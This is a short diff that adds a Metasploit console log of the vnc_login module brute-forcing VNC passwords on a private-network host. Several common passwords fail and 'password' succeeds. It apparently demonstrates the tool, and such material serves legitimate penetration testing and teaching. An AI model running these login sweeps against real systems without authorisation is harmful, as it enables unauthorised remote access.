@@ -1,0 +1,11 @@
+msf auxiliary(vnc_login) > set RHOSTS 10.0.0.100
+RHOSTS => 10.0.0.100
+msf auxiliary(vnc_login) > run
+
+[*] 10.0.0.100:5900 - Starting VNC login sweep
+[-] 10.0.0.100:5900 VNC - LOGIN FAILED: :admin
+[-] 10.0.0.100:5900 VNC - LOGIN FAILED: :1234
+[-] 10.0.0.100:5900 VNC - LOGIN FAILED: :qwerty123
+[+] 10.0.0.100:5900 - LOGIN SUCCESSFUL: :password
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
